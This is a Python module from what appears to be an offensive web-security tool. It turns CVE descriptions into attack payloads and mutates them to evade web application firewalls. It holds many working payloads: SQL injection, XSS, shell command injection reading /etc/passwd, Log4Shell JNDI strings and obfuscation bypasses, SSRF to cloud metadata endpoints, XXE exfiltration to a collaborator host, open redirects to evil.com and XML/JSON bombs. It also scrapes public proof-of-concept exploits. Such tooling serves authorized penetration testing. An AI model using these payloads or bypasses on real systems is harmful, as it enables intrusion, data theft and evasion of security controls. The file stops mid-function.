#!/usr/bin/env python3
"""
Fray — Payload Creation from CVE Description (#144)

Generates targeted security payloads from CVE descriptions using:
  1. Pattern matching — map CVE keywords to known payload templates
  2. Parameter extraction — pull affected software, version, vector from CVE text
  3. Payload synthesis — combine templates with CVE-specific parameters
  4. Optional LLM enhancement — use AI to generate novel bypass variants

Supports:
  - NVD JSON format (from fray feed / threat_intel)
  - Raw CVE-ID lookup (fetches from NVD API)
  - Free-text vulnerability descriptions
  - Batch processing from JSONL

CLI:
    fray cve-payload CVE-2024-12345
    fray cve-payload CVE-2024-12345 --test-target https://example.com
    fray cve-payload --description "SQL injection in login form via username param"
    fray cve-payload --file cves.jsonl -o payloads.json
"""

import http.client
import json
import os
import re
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    from fray import __version__
except ImportError:
    __version__ = "dev"


# ── CVE → Vulnerability Type Classification ──────────────────────────────────

_CVE_PATTERNS = [
    # (regex on description, vuln_type, base_severity)
    (r"sql\s*inject|sqli|sql\s+command", "sqli", "critical"),
    (r"cross.?site\s*script|xss|script\s*inject", "xss", "high"),
    (r"remote\s*code\s*execut|\brce\b|command\s*inject|os\s*command|jndi\s*inject|log4j|code\s*execut|arbitrary\s*code", "rce", "critical"),
    (r"server.?side\s*request\s*forg|ssrf", "ssrf", "high"),
    (r"server.?side\s*template\s*inject|ssti", "ssti", "critical"),
    (r"path\s*travers|directory\s*travers|\.\.\/|local\s*file\s*inclus|lfi", "lfi", "high"),
    (r"remote\s*file\s*inclus|rfi", "rfi", "high"),
    (r"xml\s*external\s*entit|xxe", "xxe", "high"),
    (r"insecure\s*deseria|deserialization|object\s*inject", "deserialization", "critical"),
    (r"open\s*redirect|url\s*redirect|redirect\s*bypass", "open_redirect", "medium"),
    (r"cross.?site\s*request\s*forg|csrf|xsrf", "csrf", "medium"),
    (r"authentication\s*bypass|auth\s*bypass|login\s*bypass|bypass\w*\s+(?:\w+\s+){0,3}authenticat", "auth_bypass", "critical"),
    (r"privilege\s*escalat|priv\s*esc|unauthorized\s*access|elevation\s*of\s*privilege", "privesc", "high"),
    (r"denial\s*of\s*service|\bdos\b|ddos|resource\s*exhaust|resource\s*consumpt", "dos", "medium"),
    (r"buffer\s*overflow|stack\s*overflow|heap\s*overflow", "overflow", "critical"),
    (r"information\s*disclos|info\s*leak|data\s*expos", "info_disclosure", "medium"),
    (r"idor|insecure\s*direct\s*object|broken\s*access", "idor", "high"),
    (r"prototype\s*pollut", "prototype_pollution", "high"),
    (r"cache\s*poison", "cache_poison", "medium"),
    (r"request\s*smuggl|http\s*smuggl|cl\.te|te\.cl", "smuggling", "high"),
    (r"crlf\s*inject|header\s*inject|response\s*split", "crlf", "medium"),
    (r"ldap\s*inject", "ldap_injection", "high"),
    (r"xpath\s*inject", "xpath_injection", "high"),
    (r"race\s*condition|toctou|time.?of.?check", "race_condition", "medium"),
]

# ── Payload Templates per Vulnerability Type ─────────────────────────────────

_PAYLOAD_TEMPLATES: Dict[str, List[Dict[str, str]]] = {
    "sqli": [
        {"payload": "' OR '1'='1", "context": "authentication bypass", "technique": "tautology"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "context": "data extraction", "technique": "union"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "context": "blind detection", "technique": "time_based"},
        {"payload": "1' AND (SELECT SLEEP(5))--", "context": "blind MySQL", "technique": "time_based"},
        {"payload": "' OR 1=1 LIMIT 1--", "context": "authentication bypass", "technique": "tautology"},
        {"payload": "admin'--", "context": "login bypass", "technique": "comment_truncation"},
    ],
    "xss": [
        {"payload": "<script>alert(document.domain)</script>", "context": "reflected", "technique": "direct"},
        {"payload": "<img src=x onerror=alert(1)>", "context": "reflected", "technique": "event_handler"},
        {"payload": "\"><svg/onload=alert(1)>", "context": "attribute breakout", "technique": "tag_injection"},
        {"payload": "javascript:alert(1)", "context": "href/src injection", "technique": "protocol"},
        {"payload": "'-alert(1)-'", "context": "template literal", "technique": "js_context"},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "context": "angular/template", "technique": "ssti_xss"},
    ],
    "rce": [
        {"payload": "; id", "context": "command chaining", "technique": "semicolon"},
        {"payload": "| cat /etc/passwd", "context": "pipe injection", "technique": "pipe"},
        {"payload": "$(whoami)", "context": "command substitution", "technique": "subshell"},
        {"payload": "`id`", "context": "backtick execution", "technique": "backtick"},
        {"payload": "127.0.0.1%0aid", "context": "newline injection", "technique": "crlf"},
        {"payload": "{${sleep(5)}}", "context": "expression language", "technique": "el_injection"},
        {"payload": "${jndi:ldap://BURP_COLLAB/a}", "context": "Log4Shell JNDI", "technique": "jndi_lookup"},
        {"payload": "${jndi:dns://BURP_COLLAB}", "context": "Log4Shell DNS OOB", "technique": "jndi_dns"},
        {"payload": "${${lower:j}${lower:n}${lower:d}i:ldap://BURP_COLLAB/a}", "context": "Log4Shell bypass", "technique": "jndi_obfuscated"},
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1", "context": "localhost access", "technique": "direct"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "context": "AWS metadata", "technique": "cloud_metadata"},
        {"payload": "http://[::1]", "context": "IPv6 localhost", "technique": "ipv6"},
        {"payload": "http://0x7f000001", "context": "hex IP bypass", "technique": "encoding"},
        {"payload": "gopher://127.0.0.1:6379/_INFO", "context": "Redis via gopher", "technique": "protocol_smuggling"},
    ],
    "ssti": [
        {"payload": "{{7*7}}", "context": "Jinja2/Twig detection", "technique": "arithmetic"},
        {"payload": "${7*7}", "context": "Freemarker/EL detection", "technique": "arithmetic"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "context": "Jinja2 RCE", "technique": "class_traversal"},
        {"payload": "<%= 7*7 %>", "context": "ERB/EJS detection", "technique": "arithmetic"},
        {"payload": "#{7*7}", "context": "Ruby/Slim detection", "technique": "arithmetic"},
    ],
    "lfi": [
        {"payload": "../../../../etc/passwd", "context": "Unix LFI", "technique": "traversal"},
        {"payload": "....//....//....//etc/passwd", "context": "filter bypass", "technique": "double_dot"},
        {"payload": "/etc/passwd%00.jpg", "context": "null byte", "technique": "null_byte"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "context": "PHP wrapper", "technique": "php_filter"},
        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "context": "Windows LFI", "technique": "backslash"},
    ],
    "xxe": [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         "context": "file read", "technique": "entity_expansion"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLAB">]><foo>&xxe;</foo>',
         "context": "OOB exfiltration", "technique": "oob_http"},
    ],
    "deserialization": [
        {"payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "context": "Java deserialization", "technique": "gadget_chain"},
        {"payload": 'O:8:"stdClass":0:{}', "context": "PHP object injection", "technique": "php_unserialize"},
        {"payload": '{"__class__": "subprocess.Popen", "__args__": ["id"]}', "context": "Python pickle-like", "technique": "python_deser"},
    ],
    "open_redirect": [
        {"payload": "//evil.com", "context": "protocol-relative", "technique": "double_slash"},
        {"payload": "/\\evil.com", "context": "backslash bypass", "technique": "backslash"},
        {"payload": "https://evil.com@legitimate.com", "context": "@ bypass", "technique": "at_sign"},
    ],
    "auth_bypass": [
        {"payload": '{"role": "admin"}', "context": "role tampering", "technique": "mass_assignment"},
        {"payload": "X-Forwarded-For: 127.0.0.1", "context": "IP whitelist bypass", "technique": "header_spoof"},
        {"payload": '{"alg": "none"}', "context": "JWT none algorithm", "technique": "jwt_none"},
    ],
    "idor": [
        {"payload": "/api/users/1", "context": "sequential ID", "technique": "id_enumeration"},
        {"payload": "/api/users/VICTIM_UUID", "context": "UUID guessing", "technique": "uuid_enum"},
    ],
    "prototype_pollution": [
        {"payload": '{"__proto__": {"admin": true}}', "context": "proto override", "technique": "proto_key"},
        {"payload": '{"constructor": {"prototype": {"isAdmin": true}}}', "context": "constructor chain", "technique": "constructor"},
    ],
    "crlf": [
        {"payload": "%0d%0aSet-Cookie:hacked=1", "context": "header injection", "technique": "crlf_header"},
        {"payload": "%0d%0a%0d%0a<script>alert(1)</script>", "context": "response splitting", "technique": "response_split"},
    ],
    "cache_poison": [
        {"payload": "X-Forwarded-Host: evil.com", "context": "host override", "technique": "unkeyed_header"},
        {"payload": "X-Original-URL: /admin", "context": "path override", "technique": "path_override"},
    ],
    "smuggling": [
        {"payload": "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x", "context": "TE.TE", "technique": "te_te"},
        {"payload": "Content-Length: 0\\r\\nTransfer-Encoding: chunked", "context": "CL.TE", "technique": "cl_te"},
    ],
    "dos": [
        {"payload": "GET / HTTP/1.1\r\nHost: TARGET\r\n" * 50, "context": "request flood", "technique": "repeated_request"},
        {"payload": '{"query":"{' + 'a(b:{' * 30 + '}}' * 30 + '}"}', "context": "nested JSON DoS", "technique": "json_bomb"},
        {"payload": "<xml>" + "<a>" * 100000 + "</a>" * 100000 + "</xml>", "context": "XML bomb", "technique": "billion_laughs"},
        {"payload": "A" * 100000, "context": "large payload", "technique": "buffer_overflow"},
    ],
    "privesc": [
        {"payload": '{"role": "admin"}', "context": "role escalation", "technique": "mass_assignment"},
        {"payload": '{"is_admin": true, "user_type": "superuser"}', "context": "privilege field tampering", "technique": "field_injection"},
        {"payload": 'X-Forwarded-For: 127.0.0.1', "context": "IP-based privilege", "technique": "header_spoof"},
        {"payload": '{"user_id": 1}', "context": "admin ID substitution", "technique": "idor_privesc"},
        {"payload": '../../../admin', "context": "path traversal to admin", "technique": "path_traversal"},
    ],
}

# ── CWE → Vulnerability Type Mapping ─────────────────────────────────────────

_CWE_MAP = {
    "CWE-79": "xss", "CWE-89": "sqli", "CWE-78": "rce", "CWE-77": "rce",
    "CWE-94": "rce", "CWE-918": "ssrf", "CWE-22": "lfi", "CWE-611": "xxe",
    "CWE-502": "deserialization", "CWE-601": "open_redirect", "CWE-352": "csrf",
    "CWE-287": "auth_bypass", "CWE-269": "privesc", "CWE-400": "dos",
    "CWE-120": "overflow", "CWE-200": "info_disclosure", "CWE-639": "idor",
    "CWE-1321": "prototype_pollution", "CWE-113": "crlf", "CWE-90": "ldap_injection",
    "CWE-643": "xpath_injection", "CWE-362": "race_condition",
    "CWE-284": "auth_bypass", "CWE-306": "auth_bypass", "CWE-862": "idor",
    "CWE-863": "privesc", "CWE-98": "rfi", "CWE-434": "rce",
    "CWE-476": "dos", "CWE-787": "overflow", "CWE-416": "overflow",
    "CWE-190": "overflow", "CWE-776": "dos", "CWE-444": "smuggling",
}

# Default payloads for unmapped types
_DEFAULT_PAYLOADS = [
    {"payload": "{{7*7}}", "context": "template injection probe", "technique": "arithmetic"},
    {"payload": "' OR '1'='1", "context": "injection probe", "technique": "tautology"},
    {"payload": "<script>alert(1)</script>", "context": "XSS probe", "technique": "direct"},
]


# ── CVE Data Fetching ────────────────────────────────────────────────────────

def _fetch_cve_nvd(cve_id: str, timeout: int = 10) -> Optional[Dict[str, Any]]:
    """Fetch CVE data from NVD API 2.0."""
    try:
        conn = http.client.HTTPSConnection("services.nvd.nist.gov", timeout=timeout)
        path = f"/rest/json/cves/2.0?cveId={urllib.parse.quote(cve_id)}"
        conn.request("GET", path, headers={
            "User-Agent": f"Fray/{__version__}",
            "Accept": "application/json",
        })
        resp = conn.getresponse()
        if resp.status != 200:
            return None
        body = resp.read(256 * 1024).decode("utf-8", "replace")
        conn.close()
        data = json.loads(body)
        vulns = data.get("vulnerabilities", [])
        if vulns:
            return vulns[0].get("cve", {})
        return None
    except Exception:
        return None


def _extract_cve_info(cve_data: Dict[str, Any]) -> Dict[str, Any]:
    """Extract key info from NVD CVE JSON."""
    cve_id = cve_data.get("id", "")
    descriptions = cve_data.get("descriptions", [])
    desc = ""
    for d in descriptions:
        if d.get("lang") == "en":
            desc = d.get("value", "")
            break
    if not desc and descriptions:
        desc = descriptions[0].get("value", "")

    # CVSS score
    metrics = cve_data.get("metrics", {})
    cvss_score = 0.0
    cvss_severity = ""
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        m = metrics.get(key, [])
        if m:
            cvss_data = m[0].get("cvssData", {})
            cvss_score = cvss_data.get("baseScore", 0.0)
            cvss_severity = cvss_data.get("baseSeverity", "")
            break

    # CWE IDs
    cwe_ids = []
    for weakness in cve_data.get("weaknesses", []):
        for wd in weakness.get("description", []):
            val = wd.get("value", "")
            if val.startswith("CWE-"):
                cwe_ids.append(val)

    # Affected software (CPE)
    configs = cve_data.get("configurations", [])
    affected = []
    for cfg in configs:
        for node in cfg.get("nodes", []):
            for match in node.get("cpeMatch", []):
                cpe = match.get("criteria", "")
                if cpe:
                    parts = cpe.split(":")
                    if len(parts) > 4:
                        affected.append({
                            "vendor": parts[3],
                            "product": parts[4],
                            "version": parts[5] if len(parts) > 5 else "*",
                        })

    # References
    refs = [r.get("url", "") for r in cve_data.get("references", [])]

    return {
        "cve_id": cve_id,
        "description": desc,
        "cvss_score": cvss_score,
        "cvss_severity": cvss_severity,
        "cwe_ids": cwe_ids,
        "affected_software": affected[:10],
        "references": refs[:10],
    }


# ── Classification + Payload Generation ──────────────────────────────────────

def _classify_vuln(description: str) -> List[Tuple[str, str]]:
    """Classify vulnerability type(s) from description text.

    Returns list of (vuln_type, severity) tuples.
    """
    desc_lower = description.lower()
    matches = []
    for pattern, vuln_type, severity in _CVE_PATTERNS:
        if re.search(pattern, desc_lower):
            matches.append((vuln_type, severity))
    if not matches:
        matches.append(("unknown", "medium"))
    return matches


def _extract_parameters(description: str) -> Dict[str, str]:
    """Extract attack-relevant parameters from CVE description."""
    params: Dict[str, str] = {}

    # Extract parameter names — match both "username parameter" and "parameter username"
    param_matches = re.findall(
        r'(?:the\s+)?(\w+)\s+(?:parameter|param|field|input|argument)',
        description, re.IGNORECASE)
    if not param_matches:
        param_matches = re.findall(
            r'(?:parameter|param|field|input|argument)\s+["\']?(\w+)["\']?',
            description, re.IGNORECASE)
    # Filter out noise words
    _NOISE = {"the", "a", "an", "this", "that", "each", "every", "any", "some", "of", "in", "via"}
    param_matches = [p for p in param_matches if p.lower() not in _NOISE]
    if param_matches:
        params["parameter"] = param_matches[0]

    # Extract endpoint paths — strip URLs first, then find bare paths
    desc_no_urls = re.sub(r'https?://\S+', '', description)
    path_matches = re.findall(r'(/[\w/.-]+)', desc_no_urls)
    # Filter out version strings, short noise paths, and common English fragments
    _PATH_NOISE = {"/or", "/to", "/a", "/an", "/the", "/in", "/on", "/of", "/is", "/it",
                   "/as", "/at", "/by", "/be", "/if", "/no", "/do", "/up", "/so"}
    path_matches = [p for p in path_matches if
                    not p.startswith('//') and
                    not re.match(r'^/\d+\.\d+', p) and
                    len(p) > 3 and
                    p.lower() not in _PATH_NOISE]
    if path_matches:
        params["path"] = path_matches[0]

    # Extract affected component
    comp_matches = re.findall(
        r'(?:in|of|via|through)\s+(?:the\s+)?(\w+(?:\s+\w+)?)\s+(?:component|module|function|endpoint|page|feature)',
        description, re.IGNORECASE)
    if comp_matches:
        params["component"] = comp_matches[0]

    return params


def generate_payloads_from_cve(
    cve_id: str = "",
    description: str = "",
    cve_data: Optional[Dict[str, Any]] = None,
    max_payloads: int = 10,
    timeout: int = 10,
    extract_poc: bool = True,
) -> Dict[str, Any]:
    """Generate targeted payloads from a CVE ID or description.

    Args:
        cve_id: CVE identifier (e.g., CVE-2024-12345). Fetches from NVD.
        description: Free-text vulnerability description (alternative to cve_id).
        cve_data: Pre-fetched NVD CVE data dict (skip API call).
        max_payloads: Maximum number of payloads to generate.
        timeout: API request timeout.
        extract_poc: Scrape GitHub/PacketStorm for real PoC payloads (default: True).

    Returns:
        Dict with cve_info, vuln_types, payloads, poc_payloads, and metadata.
    """
    result: Dict[str, Any] = {
        "cve_id": cve_id,
        "description": description,
        "vuln_types": [],
        "payloads": [],
        "poc_payloads": [],
        "poc_sources": [],
        "affected_software": [],
        "cvss_score": 0.0,
        "parameters": {},
        "error": "",
    }

    # Step 1: Get CVE data
    if cve_id and not cve_data:
        cve_data = _fetch_cve_nvd(cve_id, timeout)
        if not cve_data:
            result["error"] = f"Could not fetch CVE data for {cve_id}"
            # Fall through — if description is provided we can still work

    cwe_ids: List[str] = []
    if cve_data:
        info = _extract_cve_info(cve_data)
        result["cve_id"] = info["cve_id"]
        result["description"] = info["description"]
        result["cvss_score"] = info["cvss_score"]
        result["affected_software"] = info["affected_software"]
        cwe_ids = info.get("cwe_ids", [])
        result["cwe_ids"] = cwe_ids
        description = info["description"]

    if not description:
        result["error"] = "No CVE data or description provided"
        return result

    # Step 2: Classify vulnerability type (description-based)
    vuln_matches = _classify_vuln(description)

    # Step 2b: If only "unknown" matched, try CWE-based classification
    if len(vuln_matches) == 1 and vuln_matches[0][0] == "unknown" and cwe_ids:
        cwe_matches = []
        for cwe_id in cwe_ids:
            if cwe_id in _CWE_MAP:
                vtype = _CWE_MAP[cwe_id]
                # Infer severity from CVSS if available
                score = result.get("cvss_score", 0.0)
                if score >= 9.0:
                    sev = "critical"
                elif score >= 7.0:
                    sev = "high"
                elif score >= 4.0:
                    sev = "medium"
                else:
                    sev = "low"
                cwe_matches.append((vtype, sev))
        if cwe_matches:
            vuln_matches = cwe_matches

    result["vuln_types"] = [{"type": vt, "severity": sev} for vt, sev in vuln_matches]

    # Step 3: Extract parameters
    params = _extract_parameters(description)
    result["parameters"] = params

    # Step 4: Extract real PoC payloads from exploit references
    poc_payloads = []
    if extract_poc and cve_data:
        try:
            from fray.poc_extractor import extract_poc_payloads
            poc_result = extract_poc_payloads(
                cve_id=result.get("cve_id", cve_id),
                cve_data=cve_data,
                max_sources=4,
                timeout=timeout,
                delay=0.5,
            )
            result["poc_sources"] = poc_result.poc_references[:6]

            # Convert extracted PoC payloads into our payload format
            for ep in poc_result.extracted_payloads:
                sev = vuln_matches[0][1] if vuln_matches else "high"
                entry = {
                    "payload": ep["payload"][:500],
                    "vuln_type": vuln_matches[0][0] if vuln_matches else "unknown",
                    "severity": sev,
                    "context": ep.get("context", ""),
                    "technique": ep.get("technique", ""),
                    "source": "poc",
                    "confidence": ep.get("confidence", 0.0),
                    "method": ep.get("method", ""),
                    "path": ep.get("path", ""),
                }
                if ep.get("headers"):
                    entry["headers"] = ep["headers"]
                if ep.get("body"):
                    entry["body"] = ep["body"][:500]
                if ep.get("source_file"):
                    entry["source_file"] = ep["source_file"]
                poc_payloads.append(entry)
        except Exception as e:
            result["error"] = f"PoC extraction error: {str(e)[:100]}"

    result["poc_payloads"] = poc_payloads

    # Step 5: Generate template-based payloads
    payloads = []
    seen = set()

    # PoC payloads go first (real exploit data = highest priority)
    for pp in poc_payloads:
        key = pp["payload"][:200]
        if key not in seen and len(payloads) < max_payloads:
            seen.add(key)
            payloads.append(pp)

    # Fill remaining slots with template payloads
    for vuln_type, severity in vuln_matches:
        if len(payloads) >= max_payloads:
            break
        templates = _PAYLOAD_TEMPLATES.get(vuln_type, _DEFAULT_PAYLOADS)
        for tmpl in templates:
            p = tmpl["payload"]
            if p in seen:
                continue
            seen.add(p)
            entry = {
                "payload": p,
                "vuln_type": vuln_type,
                "severity": severity,
                "context": tmpl.get("context", ""),
                "technique": tmpl.get("technique", ""),
                "source": "template",
            }
            # Customize with extracted parameters
            if params.get("parameter"):
                entry["target_parameter"] = params["parameter"]
            if params.get("path"):
                entry["target_path"] = params["path"]
            payloads.append(entry)
            if len(payloads) >= max_payloads:
                break

    # If no specific payloads matched, add defaults
    if not payloads:
        for tmpl in _DEFAULT_PAYLOADS[:max_payloads]:
            payloads.append({
                "payload": tmpl["payload"],
                "vuln_type": "unknown",
                "severity": "medium",
                "context": tmpl["context"],
                "technique": tmpl["technique"],
                "source": "template",
            })

    result["payloads"] = payloads
    return result


def generate_payloads_batch(
    source: str,
    max_payloads: int = 5,
    output: str = "",
    timeout: int = 10,
) -> List[Dict[str, Any]]:
    """Generate payloads from a JSONL file of CVEs.

    Each line should have either 'cve_id' or 'description'.

    Returns list of results.
    """
    results = []
    with open(source, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                # Treat as plain CVE ID
                entry = {"cve_id": line}

            cve_id = entry.get("cve_id", entry.get("id", ""))
            desc = entry.get("description", "")
            r = generate_payloads_from_cve(
                cve_id=cve_id, description=desc,
                max_payloads=max_payloads, timeout=timeout,
            )
            results.append(r)
            time.sleep(0.5)  # Rate limit NVD API

    if output:
        Path(output).parent.mkdir(parents=True, exist_ok=True)
        with open(output, "w") as f:
            for r in results:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    return results


# ── PoC Re-check (stale CVEs) ────────────────────────────────────────────────

_POC_CACHE_PATH = Path.home() / ".fray" / "cve_poc_cache.json"


def recheck_stale_pocs(
    max_age_days: int = 30,
    max_cves: int = 50,
    timeout: int = 10,
    verbose: bool = True,
) -> Dict[str, Any]:
    """Re-check CVEs that previously had no PoC.

    PoCs often appear days or weeks after a CVE is publicly disclosed.
    This function looks at the PoC cache, finds CVEs with poc_count=0
    that haven't been re-checked recently, and tries again.

    Args:
        max_age_days: Only re-check entries older than this many days.
        max_cves: Maximum number of CVEs to re-check per run.
        timeout: Per-request timeout.
        verbose: Print progress.

    Returns:
        Dict with stats: checked, new_pocs, updated_cves, etc.
    """
    stats = {"checked": 0, "new_pocs": 0, "updated_cves": [], "errors": 0}

    # Load cache
    cache = {}
    if _POC_CACHE_PATH.exists():
        try:
            cache = json.loads(_POC_CACHE_PATH.read_text())
        except Exception:
            pass

    if not cache:
        if verbose:
            print("  No PoC cache found. Run 'fray cve-payload' or 'fray feed' first.")
        return stats

    # Find stale CVEs: poc_count=0 and enriched_at > max_age_days ago
    import datetime
    cutoff = datetime.datetime.utcnow() - datetime.timedelta(days=max_age_days)
    cutoff_str = cutoff.strftime("%Y-%m-%dT%H:%M:%SZ")

    stale = []
    for cve_id, entry in cache.items():
        if not isinstance(entry, dict):
            continue
        if entry.get("poc_count", 0) > 0:
            continue  # already has PoC
        enriched = entry.get("enriched_at", "")
        recheck_at = entry.get("last_recheck", enriched)
        if recheck_at and recheck_at < cutoff_str:
            cvss = entry.get("cvss_score", 0)
            stale.append((cve_id, cvss, recheck_at))

    # Sort by CVSS score descending (highest severity first)
    stale.sort(key=lambda x: -x[1])
    todo = stale[:max_cves]

    if verbose:
        print(f"\n  PoC Re-check: {len(stale)} stale CVEs, processing top {len(todo)}")

    for i, (cve_id, cvss, _) in enumerate(todo, 1):
        stats["checked"] += 1
        try:
            result = generate_payloads_from_cve(
                cve_id=cve_id, max_payloads=15,
                timeout=timeout, extract_poc=True,
            )
            poc_count = len(result.get("poc_payloads", []))
            now_str = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

            if poc_count > 0:
                stats["new_pocs"] += poc_count
                stats["updated_cves"].append(cve_id)
                # Update cache with new PoC data
                cache[cve_id].update({
                    "poc_count": poc_count,
                    "poc_payloads": result.get("poc_payloads", []),
                    "poc_sources": result.get("poc_sources", []),
                    "source_count": len(result.get("poc_sources", [])),
                    "last_recheck": now_str,
                })
                if verbose:
                    print(f"  ● [{i}/{len(todo)}] {cve_id}  CVSS {cvss:4.1f}  "
                          f"\033[92m{poc_count} NEW PoC found!\033[0m")
            else:
                cache[cve_id]["last_recheck"] = now_str
                if verbose:
                    print(f"  ○ [{i}/{len(todo)}] {cve_id}  CVSS {cvss:4.1f}  still no PoC")

        except Exception as e:
            stats["errors"] += 1
            if verbose:
                print(f"  ✗ [{i}/{len(todo)}] {cve_id}  {str(e)[:50]}")

        # Rate limit
        if i < len(todo):
            time.sleep(2.0)

    # Save updated cache
    _POC_CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    _POC_CACHE_PATH.write_text(json.dumps(cache, indent=2, ensure_ascii=False, default=str))

    if verbose:
        print(f"\n  Re-check complete: {stats['checked']} checked, "
              f"{stats['new_pocs']} new PoC payloads across "
              f"{len(stats['updated_cves'])} CVEs")
        if stats["updated_cves"]:
            print(f"  Updated: {', '.join(stats['updated_cves'][:10])}")

    return stats


# ── CVE Payload Mutator ──────────────────────────────────────────────────────
# Generates context-aware variations of PoC payloads for WAF bypass testing.

def _mutate_path(path: str) -> List[str]:
    """Generate path encoding variations."""
    import urllib.parse
    variants = []
    # Double URL encode
    variants.append(urllib.parse.quote(path, safe='/'))
    variants.append(urllib.parse.quote(urllib.parse.quote(path, safe=''), safe=''))
    # Unicode normalization bypass (e.g. %c0%af for /)
    variants.append(path.replace("/", "/%2e/"))
    variants.append(path.replace("/", "/./"))
    variants.append(path.replace("/", "\\"))
    # Case variation
    if any(c.isalpha() for c in path):
        variants.append(path.swapcase())
    # Path traversal injection
    if "/" in path and not path.endswith("/"):
        variants.append(path + "/")
        variants.append(path + ";")
        variants.append(path + "%00")
    # Null byte
    variants.append(path.replace(".", "%00."))
    return [v for v in variants if v != path and v.strip()]


def _mutate_params(query: str) -> List[str]:
    """Generate query parameter variations."""
    import urllib.parse
    variants = []
    if not query:
        return variants
    # URL encode values
    variants.append(urllib.parse.quote(query, safe='=&'))
    # Double encode
    variants.append(urllib.parse.quote(urllib.parse.quote(query, safe=''), safe=''))
    # Add HPP (HTTP Parameter Pollution) — duplicate params
    if "=" in query:
        parts = query.split("&")
        if parts:
            variants.append(query + "&" + parts[0])
    # Unicode fullwidth
    fw_map = {'+': '\uff0b', '=': '\uff1d', '&': '\uff06', '%': '\uff05'}
    fw = query
    for orig, repl in fw_map.items():
        fw = fw.replace(orig, repl)
    if fw != query:
        variants.append(fw)
    return [v for v in variants if v != query and v.strip()]


def _mutate_headers(headers: Dict[str, str]) -> List[Dict[str, str]]:
    """Generate header variations for WAF bypass."""
    variants = []
    if not headers:
        return variants
    # Add common WAF bypass headers
    bypass_hdrs = dict(headers)
    bypass_hdrs["X-Originating-IP"] = "127.0.0.1"
    variants.append(bypass_hdrs)

    bypass_hdrs2 = dict(headers)
    bypass_hdrs2["X-Forwarded-For"] = "127.0.0.1"
    bypass_hdrs2["X-Real-Ip"] = "127.0.0.1"
    variants.append(bypass_hdrs2)

    # Content-Type variation (if present)
    if "Content-Type" in headers:
        ct_var = dict(headers)
        ct = headers["Content-Type"]
        if "application/x-www-form-urlencoded" in ct:
            ct_var["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary"
        elif "application/json" in ct:
            ct_var["Content-Type"] = "application/json; charset=utf-8"
        variants.append(ct_var)

    # Transfer-Encoding smuggle hint
    te_var = dict(headers)
    te_var["Transfer-Encoding"] = "chunked"
    variants.append(te_var)

    return variants


def _mutate_body(body: str, vuln_type: str = "") -> List[str]:
    """Generate body payload variations."""
    import urllib.parse
    variants = []
    if not body:
        return variants
    # URL encode
    variants.append(urllib.parse.quote(body))
    # Whitespace obfuscation (add tabs/spaces)
    variants.append(body.replace(" ", "\t"))
    # Case variation for PHP/command payloads
    if "<?php" in body.lower():
        variants.append(body.replace("<?php", "<?PHP"))
        variants.append(body.replace("<?php", "<?\n php"))
        variants.append(body.replace("phpinfo()", "PhPiNfO()"))
        variants.append(body.replace("phpinfo()", "system('id')"))
        variants.append(body.replace("phpinfo()", "passthru('whoami')"))
    # Command substitution variations
    if "id" in body:
        variants.append(body.replace("id", "whoami"))
    if "whoami" in body:
        variants.append(body.replace("whoami", "cat /etc/passwd"))
    # JNDI variations
    if "${jndi:" in body:
        variants.append(body.replace("${jndi:", "${${lower:j}ndi:"))
        variants.append(body.replace("ldap://", "rmi://"))
        variants.append(body.replace("ldap://", "dns://"))
    # SQLi variations
    if "UNION" in body.upper():
        variants.append(body.replace("UNION", "/*!UNION*/"))
        variants.append(body.replace("SELECT", "SeLeCt"))

    # Vuln-type-aware body mutations
    variants.extend(_mutate_payload_by_vuln_type(body, vuln_type))

    return [v for v in variants if v != body and v.strip()]


def _mutate_payload_by_vuln_type(payload: str, vuln_type: str) -> List[str]:
    """Generate vuln-class-specific mutations — how real attackers tweak payloads.

    Each vuln type has its own set of evasion/variation patterns that bad actors
    commonly use to bypass WAFs and detection.
    """
    import urllib.parse
    variants = []
    vt = (vuln_type or "").lower()
    p = payload

    # ── Log4Shell / JNDI (CVE-2021-44228 and variants) ─────────────────
    if "jndi" in p.lower() or vt == "rce" and "${" in p:
        # Nested lookup obfuscation — 12+ known bypass patterns
        variants.append(p.replace("${jndi:", "${${lower:j}ndi:"))
        variants.append(p.replace("${jndi:", "${${lower:j}${lower:n}${lower:d}${lower:i}:"))
        variants.append(p.replace("${jndi:", "${${upper:j}ndi:"))
        variants.append(p.replace("${jndi:", "${j${::-n}di:"))
        variants.append(p.replace("${jndi:", "${${env:NaN:-j}ndi:"))
        variants.append(p.replace("${jndi:", "${jn${::-d}i:"))
        variants.append(p.replace("${jndi:", "${jndi${::-:}"))
        # Protocol swap
        variants.append(p.replace("ldap://", "ldaps://"))
        variants.append(p.replace("ldap://", "rmi://"))
        variants.append(p.replace("ldap://", "dns://"))
        variants.append(p.replace("ldap://", "iiop://"))
        variants.append(p.replace("ldap://", "corba://"))
        # Header injection targets
        if "User-Agent" not in p and "X-Forwarded-For" not in p:
            variants.append(p)  # same payload, different injection point hint

    # ── SQL Injection ───────────────────────────────────────────────────
    if vt in ("sqli", "sql_injection") or any(kw in p.upper() for kw in ("UNION", "SELECT", "OR 1=1", "' OR", "1=1")):
        # Inline comment obfuscation
        for kw in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR"):
            if kw in p.upper():
                variants.append(p.replace(kw, f"/*!{kw}*/"))
